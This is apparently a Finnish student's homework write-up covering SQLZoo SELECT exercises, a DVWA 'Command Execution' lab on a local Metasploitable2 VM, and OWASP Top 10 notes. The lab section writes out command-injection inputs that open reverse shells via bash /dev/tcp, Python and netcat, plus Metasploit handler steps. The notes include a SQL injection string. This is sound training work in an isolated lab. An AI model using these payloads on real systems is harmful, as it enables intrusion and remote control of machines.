# A
## 0 SELECT basics
Tehtävät olivat suhteellisen suoraviivaisia joten en niihin sen tarkemmin paneudu. Vaikka ovatkin kyllä hyvää kertausta
![image](https://user-images.githubusercontent.com/71498717/201321779-d361bcb7-1681-4225-9534-0db67eb2de6c.png)  
![image](https://user-images.githubusercontent.com/71498717/201321977-bbc77216-16c7-498e-9145-f0ef26cd9b0c.png)  
![image](https://user-images.githubusercontent.com/71498717/201322083-199b921c-741c-42bc-a41d-fa422452c0c1.png)  

## 2 SELECT from World kohdat 1-5
Valittiin taulusta tietyt kohdat mitkä haluttiin näyttää eli ei kaikkia  
![image](https://user-images.githubusercontent.com/71498717/201322619-5466360e-92b6-46e0-bb8c-a50d3476f7e7.png)  
Seuraavassa filteröitiin koon perusteella näkymään ne maat joissa on yli 200 miljoonaa asukasta  
![image](https://user-images.githubusercontent.com/71498717/201323066-7059d820-2575-4d95-9fc3-4c59dea28960.png)  
Seuraavassa piti jakaa gdp väkiluvulla ja palauttaa se tieto  
![image](https://user-images.githubusercontent.com/71498717/201323801-89ff2fbe-fbff-4c10-aa67-fc6b35aaa662.png)  
Seuraavassa jaettiin väkiluku miljoonalla, jotta saatiin väkiluku näkymään miljoonissa  
![image](https://user-images.githubusercontent.com/71498717/201324459-b9ffb40b-17f0-483a-b980-74310dfd1180.png)  
Viimeisessä valittiin tietyt maat nimen perusteella  
![image](https://user-images.githubusercontent.com/71498717/201325663-5fc87e67-d7f6-4ae7-a002-2f276187e803.png)  



# B Tee paikallinen tunnus DVWA Damn Vulnerable Web App -ohjelmaan
Ensin piti etisä metasploitable2 weppipalvelin joka löytyi, kun navigoi selaimella suotaan metasploitablen IP-osoitteeseen joka minulta löytyy ```192.168.252.3```  
![image](https://user-images.githubusercontent.com/71498717/201331029-f58f14e4-f967-4758-b035-d50dd1e3167a.png)  

Kirjaudutaan sisään annetuilla tunnuksilla  
![image](https://user-images.githubusercontent.com/71498717/201332391-228925e3-7aaf-450f-bde1-b49cec77c7a3.png)  

Ja käydään vaihtamassa DVWA Security low tasolle, jotta tehtävät olisi helpompia  

![image](https://user-images.githubusercontent.com/71498717/201332554-2ee707a5-c639-4e0b-900b-34ae334c8b5c.png)  


# C Execute! Ratkaise DVWA "Command Excution".
Aloitetaan kokeilemalla mitä tapahtuu jos käyttää sivua sen käyttötarkoitukseen eli pingaamiseen  
![image](https://user-images.githubusercontent.com/71498717/201343064-91dc8007-db61-42dc-a4f5-976780c113a3.png)  
Huomattiin, että sivu serveri ajaa ```ping 192.168.252.4```komennon ja palauttaa tulokset. Tästä voidaan päätellä, että komennot tapahtuu sivua pyörittävällä koneella. Mikäli komentoja putkitetaan ```;``` merkin avulla voidaan koneessa suorittaa komentoja. Komennolla ```192.168.252.4; ls``` listautuu koneen sen kansion tiedostot  
![image](https://user-images.githubusercontent.com/71498717/201347009-1e1d33b4-4871-4d6a-b386-a1c86dbb7ebd.png)  
Kokeillaan saadaanko tätä kautta avattua reverse shell omaan koneeseen. Avataan metasploit framework ja käytetään multi/handler moduulia ```use exploit/multi/handler ``` asetetaan payloadiksi linux/x64/meterpreter_reverse_tcp. ```set payload linux/x64/meterpreter_reverse_tcp``` ```options```´siitä aukeaa tarvittavat tiedot, jotta payload saadaan käytettyä oikein  
![image](https://user-images.githubusercontent.com/71498717/201350697-71d44fea-e5a9-41f9-a5cc-d1859a2edf1e.png)  
Pitää asettaa oman koneen ip kohtaan LHOST  ```set lhost 192.168.252.4``` ja portti olikin siellä valmiina niin ei tarvitse muuta kuin ```exploit```. Nähtävästi mentiin mutkat suoriksi ja itse exploit jäi asettamatta. Eli  ```use exploit/multi/handler ``` ```show payloads``` ```set payload 196```  
![image](https://user-images.githubusercontent.com/71498717/201351916-4a241a68-18c8-483e-a231-5462ad6b1dc7.png)  
```set lhost 192.168.252.4``` ja sitten muistetaan vielä laittaa palomuuri alas erillisessä shell ikkunassa```sudo ufw disable``` ja sen jälkeen exploit.  
![image](https://user-images.githubusercontent.com/71498717/201353594-df02b1c3-2ba8-4b38-a201-736b74f03987.png)  

Jotta reverse shell voidaan avata pitää dvwa sivulta lähettää komento shellin avaamiseksi. Sivulla https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet löytyy bashin komento joten kokeillaan sitä ensiksi. ```192.168.252.4; bash -i >& /dev/tcp/192.168.252.4/4444 0>&1``` syötetään tekstikenttään ja painetaan submit. Pari kertaa submittia painettuna täytyy tulla siihen tulokseen, että ei tällä komennolla ainakaan toimi. Joten kokeillaan toista. Kokeillaan pythonia ```192.168.252.4; python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.252.4",4444))``` No ei sekään toiminut toivotulla tavalla. Sitten voisi kokeilla ihan perinteistä netcattia. ```192.168.252.4; nc -e /bin/sh 192.168.252.4 4444```. Sieltä saatiin jotain eloa, mutta ei saatu avattua reverse shelliä. Joten täytyy kokeilla jotain muuta.  
![image](https://user-images.githubusercontent.com/71498717/201360270-ccc591e2-fe0e-47fb-b90d-245ede2c99bb.png)  
Kokeillaan saadaanko eri payloadilla parempia onnistumisia. Käytetään ```set payload cmd/unix/reverse_netcat``` ja asetukset pysyy samana joten ```exploit```. dvwa sivulla käyetään ```192.168.252.4; nc -e /bin/sh 192.168.252.4 4444``` ja saatiin shelli auki  
![image](https://user-images.githubusercontent.com/71498717/201362357-6e2660d4-d1b1-4edc-88f0-e81c05d40a30.png)  
![image](https://user-images.githubusercontent.com/71498717/201362442-dca05cf9-52d9-4337-9762-92b1669bd233.png)  

Seuraavaksi yritetään päivittää yhteys meterpreter yhteyteen. Painetaan ```ctrl + z``` ja ```sessions -u 1``` ja saatin päivitettyä yhteys parempaan. ```Sessions 2``` komennolla avataan oikea sessio.

![image](https://user-images.githubusercontent.com/71498717/201365171-55dc484a-f430-417f-bc8f-0a053e7a1cb8.png)  

![image](https://user-images.githubusercontent.com/71498717/201366840-12b74fdf-de94-43be-a77f-49e0e1d6c3ab.png)  

Ja näin pääsimme koneeseen sisään.






 

# D

# X
## OWASP 10 2017
### A1 Injection
Haavoittuvuuksia löytyy yleensä SQL,LDAP,XPath,NoSQL ja XML ja muutamasta muusta.
Injektiot tehdään syöttämällä modifioitu parametri, minkä johdosta hyökkääjälle palautuu ylimääräistä dataa, tai hyökkääjä voi poistaa tauluja tai muokata niitä.
Esim. SQL tapauksessa hyökkääjä tulee SQL kyselyn ulkopuolelle käyttämällä ```'``` ja tekemällä toisen kyselyn perään tai käyttämällä ```' OR '1'=1´```.

### A2 Broken Authentication
Käytetään brute force tekniikkaa syöttämällä listoja tunnetuista salasanoista, jotta päästäisiin sisälle
Sovelluksen istuntoa ei keskeytetä tietyn ajan jälkeen ja sitä käytetään hyväksi, esim. julkisella koneella.
### A3 Sensitive Data Exposure
Salaista dataa ei ole salattu vaan se välitetään selkokielisenä. Hyökkääjä joka toimii väliäkätenä voi ottaa kaiken tiedon ylös.
Tietokanta käyttää automaattista salauksen purkua jolloin SQL injectiolla saa salatun datan selkokielisenä.
### A7 Cross Site Scripting
Hyökkääjä kaappaa käyttäjän cookien lähettämällä sen omalle sivulleen. Tämä on mahdollista, jos käyttäjän selaimessa on scripti, jonka voi saada esim painamalla, jotain linkkiä.
##  Chapter 21: Cross Site Scripting
- Jos uhrin selaimessa on xss haavoittuvuus ajetaan scripti selaimella.
- mikäli url sisältää muuttujien nimiä scriptejä pitäisi pystyä ajamaan.
- kommenttiosioon voi mahdollisesti tallentaa scriptejä, jotka ajetaan kaikilla sivulla vierailevilla.
- kommenttiosiossa voi olla myös scriptejä, jotka ajaa koodeja toiselta sivulta.
- selaimessa voi estää javascriptien ajon


# Y
